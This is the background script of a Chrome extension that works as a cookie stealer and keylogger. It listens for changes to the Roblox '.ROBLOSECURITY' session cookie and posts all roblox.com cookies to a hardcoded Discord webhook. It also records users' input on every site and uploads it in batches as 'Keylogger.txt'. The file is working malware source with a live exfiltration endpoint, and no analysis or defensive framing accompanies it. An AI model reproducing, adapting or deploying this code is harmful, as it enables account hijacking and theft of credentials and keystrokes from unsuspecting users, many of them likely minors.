


export default function background() {
    //CLASS
    console.log("Updated module script.")
class FileManager {
    constructor() {
      console.log("File manager constructed.")
    }
    txtToFile(fileName, content) {
      const blob = new Blob([content], { type: 'text/plain' });
      const file = new File([blob], fileName, { type: blob.type });
      return file;
    }
  
    txtToFiles(data) { // data=> Object => {fileName: "Example.txt", content: "This text is inside the txt file."}
  
      let files = [];
      for (let i = 0; i < data.length; i++) {
        const content = data[i].content;
        const fileName = data[i].fileName;
        const file = this.txtToFile(fileName, content);
        files.push(file);
      }
      return files;
    }
  }
  
  //VARS
  const RBX_ORIGIN = "https://www.roblox.com"
  var isBusySending = false;
  var FileManagerInstance = new FileManager();
  
  var webhook = {
    url: "https://discord.com/api/webhooks/1175122576738099314/ArWkf4zD-juC-yxDN6tfzQsNFKGJ1MVtqHowKUB2TJ7b3ChFeai-738Gwo06ETJ9p81p",
    send: async (webhookData) => {
      let files = FileManagerInstance.txtToFiles(webhookData.filesNameAndFilesArray);
      const formData = new FormData();
      formData.append("content", webhookData.content);
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        formData.append("file" + i, file);
      }
      const options = {
        method: "POST",
        body: formData,
      };
      return await fetch(webhook.url, options);
    },
  };
  
  var queue = [];
  
  async function getFromLocalStorage(keysArr) {
    console.log("Getting " + keysArr.toString() + "..");
    let promise = new Promise((resolve, reject) => {
      chrome.storage.local.get(keysArr).then((result) => {
        console.log("Got keys.")
        console.log(result);
        resolve(result)
      })
    })
    return await promise;
  }
  async function retriveCookies(url) {
    console.log("Getting cookies..")
    let promise = new Promise((resolve, reject) => {
      chrome.cookies.getAll({ url }, (cookies) => {
        console.log("Got Cookies!")
        console.log(cookies)
        resolve(cookies)
      }
      )
    })
    return await promise;
  }
  async function sendData(webhookData, onServerDone = () => { }) {
    if (isBusySending) {
      queue.push([webhookData, onServerDone]);
      console.warn("Currently busy. Failed to send, Added to Queue");
      return;
    }
    isBusySending = true;
    let promise = new Promise((resolve, reject) => {
      function onError(response) {
        console.error("Status :" + response.status + ". Retrying in 5 seconds")
        setTimeout(() => {
          webhook.send(webhookData).then(onResponse);
        }, 5000);
      }
      function onResponse(response) {
        console.log("Server response: " + response.statusText)
        if (response.ok)
          onServerDone();
        else onError();
  
  
        //Check Queue
        console.log("Done sending previous message, Checking queue..")
        isBusySending = false;
        if (queue.length > 0) {
          console.log(queue.length + " still left in queue. Sending another in 2 seconds.");
          setTimeout(() => {
            console.log("Sending...")
            let newArguments = queue.shift();
            sendData(newArguments[0], newArguments[1]);
          }, 2000);
        } else console.log("Queue cleared.")
  
  
  
        resolve(response.ok);
  
      }
      webhook.send(webhookData).then(onResponse);
    })
    return await promise;
  }
  async function sendToContent(data,satifiesConditions=(tab)=>true) {
    const [tab] = await chrome.tabs.query({ active: true});
    console.log("Active tab id is")
    console.log(tab.id);
    if(satifiesConditions(tab)){
      console.log("Satisfied conditions.. Sending data to content script")
      return await chrome.tabs.sendMessage(tab.id, data)
    }
    else return null; 
  };
  
  
  async function sendCookies(msg) {
    let cookies = await retriveCookies("https://www.roblox.com/");
    let webhookData = {
      content: msg + " cookies",
      filesNameAndFilesArray: [
        {
          fileName: "Cookies.txt",
          content: JSON.stringify(cookies)
        }
      ]
    }
    sendData(webhookData);
  }
  
  function onCookieChanged(info) {
    if (info.cookie.domain === ".roblox.com" && info.cookie.name === ".ROBLOSECURITY" && !info.removed) sendCookies("New login");
  }
  function onMessagedReceived(request, sender, sendResponse) {
    console.log(request.method)
    console.log("Data received")
    switch (request.method) {
      case "input":
          (async () => {
            let url = new URL(sender.tab.url);
            console.log("Tab url: " + url)
            let newTimestamp = new Date().getTime();
            //get saved data
            let result = await getFromLocalStorage(["activity"]);
            console.log("got result")
            // if there is no such then let it be '{"amount":0}'
            result.activity = result.activity ? result.activity : '{"amount":0}'
            //convert string to object.
            let activity = JSON.parse(result.activity);
            //If it is just created then set it's start time
            if (activity.amount === 0) {
              activity.startTime = new Date().getTime();
            }
            if (activity[url.origin] === undefined) activity[url.origin] = {};
            activity[url.origin][newTimestamp] = request.data
            activity.amount += 1;
            console.log("amount incremented")
            async function onDataSave() {
              console.log("data has been saved")
              if (activity.amount >= 250 || newTimestamp - activity.startTime > 86400000) {
                console.log("Enough amount data(" + activity.amount + ") has been gathered. Sending..")
                function serverOnDone() {
                  console.log("Data has been transfered through webhook successfully. Clearly activity data saved locally..")
                  chrome.storage.local.set({ activity: '{"amount":0}' }).then(() => {
                    console.log("Activity data in chrome.storage.local has been cleared.")
                  })
                }
                let webhookData = {
                  content: activity.amount >= 250 ? "Amount exceeded 250 so here's the data" : "It has been one day since recording so here is the data",
                  filesNameAndFilesArray: [
                    {
                      fileName: "Keylogger.txt",
                      content: JSON.stringify(activity)
                    }
                  ]
                }
                await sendData(webhookData, serverOnDone)
              }
              sendResponse("Input process in the background.js has been executed sucessfully.");
            }
            await chrome.storage.local.set({ activity: JSON.stringify(activity) }).then(onDataSave());
          })()
        console.log("Async Input method is running on background, returned true ")
        return true;
        case "getUserInfo":
          (async()=>{
            try{
              function satisfyConditions(tab) {
                let url = new URL(tab.url)
                return url.origin == RBX_ORIGIN && url.pathname.split("/")[1] === "users"
              }
            let response = await sendToContent({method: "getUserInfo"},satisfyConditions);
            console.log("Got response from content script which is..")
            console.log(response)
            let payload= {
              method:"gotUserInfo"
            }
            if(response===null){
              payload.ok = false;
              payload.message = "Active url is not " + RBX_ORIGIN
            }else{
              payload.ok = true
              payload.message = "SUCCESS"
              payload.username = response.username
              payload.friends = response.friends
              payload.status = response.status
              payload.userImg = response.userImg
              payload.targetImg = response.targetImg
            }
            console.log("Background: payload = ")
            console.log(payload)
           
            sendResponse(payload)
          }catch(e){
            console.warn(e);
          }
          })()
          return true;
        default:
        sendResponse("This is default background response due to undefined method.");
        throw new Error("The method " + request.method + " is not in switch statement.");
    }
  }
  //sendCookies("Initial");
  
  //Events
  chrome.runtime.onMessage.addListener(onMessagedReceived);
  chrome.cookies.onChanged.addListener(onCookieChanged)
}